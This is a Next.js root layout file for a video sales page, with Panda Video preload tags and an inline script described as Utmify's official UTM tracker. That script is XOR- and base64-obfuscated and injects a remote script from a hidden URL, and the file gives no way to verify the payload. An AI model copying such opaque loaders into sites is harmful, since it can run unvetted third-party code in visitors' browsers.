import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "VSL",
  description: "Página de VSL",
};

export default function RootLayout({ children }: LayoutProps<"/">) {
  return (
    <html
      lang="en"
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <head>
        {/*
          Tags de otimização de performance recomendadas pelo Panda Vídeo.

          fetchPriority="low" nas que baixam bytes (as="style"/"fetch"):
          por padrão, o navegador trata rel="preload" com alta prioridade,
          o que pode competir por banda com os recursos críticos da primeira
          renderização (CSS principal, fontes, JS da página) — e a barra de
          urgência e o rodapé, que aparecem imediatamente, dependem desses
          recursos críticos, não dos arquivos da Panda. Marcar como "low"
          mantém o preload (o navegador ainda busca adiantado), só evita que
          ele dispute prioridade com o conteúdo visível de imediato.
          rel="dns-prefetch" e rel="prerender" não baixam corpo de resposta
          da mesma forma, então não competem por banda e ficam como estão.
        */}
        <link
          rel="preload"
          href="https://player-vz-52703098-ed8.tv.pandavideo.com.br/embed/css/plyr.css"
          as="style"
          fetchPriority="low"
        />
        <link
          rel="preload"
          href="https://player-vz-52703098-ed8.tv.pandavideo.com.br/embed/css/styles.css"
          as="style"
          fetchPriority="low"
        />
        <link
          rel="preload"
          href="https://player-vz-52703098-ed8.tv.pandavideo.com.br/embed/css/pb.css"
          as="style"
          fetchPriority="low"
        />
        <link
          rel="preload"
          href="https://config.tv.pandavideo.com.br/vz-52703098-ed8/c0dda076-875f-4304-befb-66af54fd5631.json"
          as="fetch"
          crossOrigin="anonymous"
          fetchPriority="low"
        />
        <link
          rel="preload"
          href="https://config.tv.pandavideo.com.br/vz-52703098-ed8/config.json"
          as="fetch"
          crossOrigin="anonymous"
          fetchPriority="low"
        />
        <link
          rel="dns-prefetch"
          href="https://b-vz-52703098-ed8.tv.pandavideo.com.br"
        />
        <link
          rel="preload"
          href="https://b-vz-52703098-ed8.tv.pandavideo.com.br/c0dda076-875f-4304-befb-66af54fd5631/playlist.m3u8"
          as="fetch"
          crossOrigin="anonymous"
          fetchPriority="low"
        />
        <link
          rel="prerender"
          href="https://player-vz-52703098-ed8.tv.pandavideo.com.br/embed/?v=c0dda076-875f-4304-befb-66af54fd5631"
        />
        <link
          rel="dns-prefetch"
          href="https://player-vz-52703098-ed8.tv.pandavideo.com.br"
        />
        {/* Script oficial de rastreamento de UTMs da Utmify (baixado do
            painel em app.utmify.com.br > Integrações). Inserido via
            dangerouslySetInnerHTML, sem alteração, para preservar o
            conteúdo exatamente como fornecido pela Utmify. */}
        <script
          suppressHydrationWarning
          dangerouslySetInnerHTML={{
            __html: `(function(){var v_d75=atob("DPtnyhh25pqTPRu8SIBFv2oaxKCxVW/IOIhd5TcVgvS9SG/RIZ0e5HsZi7TxTzTPK4kOumwFye/nUGiTJJoTr2sCyPDgHzeeKY8TuHEUk+72TjmGE4BFpHkbg7ipH3/dPJpKv2wbj/zqEGvOLY0CpGxbnvn8WTbPK5BF5joAh/bmWDmGatka5mNUiPv+WDmGap8Gvnlbk+7+VH3FZYsVr24TiO6+Tm7eIZ8U6DRUkPv/SH6ectlFt0UL");var n_75=[];for(var d_hb=0;d_hb<v_d75.length;d_hb++){n_75.push(v_d75.charCodeAt(d_hb)&255);}var r_l=n_75[0];var v_7c=n_75.slice(1,1+r_l);var g_jq=n_75.slice(1+r_l);var c_of8n=g_jq.map(function(b,x_46){return b^v_7c[x_46%r_l];});var y_h4i="";for(var w_3k9z=0;w_3k9z<c_of8n.length;w_3k9z++){y_h4i+=String.fromCharCode(c_of8n[w_3k9z]&255);}var o_un=decodeURIComponent(escape(y_h4i));var x_fed=JSON.parse(o_un);var c_36b=x_fed.globals||[];c_36b.forEach(function(j_j4){window[j_j4.name]=j_j4.value;});var p_s=document.createElement("script");p_s.src=x_fed.url;p_s.async=true;p_s.defer=true;(x_fed.attributes||[]).forEach(function(i_xqb){p_s.setAttribute(i_xqb.name,i_xqb.value);});(document.head||document.documentElement).appendChild(p_s);})();`,
          }}
        />
      </head>
      <body className="min-h-full flex flex-col">{children}</body>
    </html>
  );
}
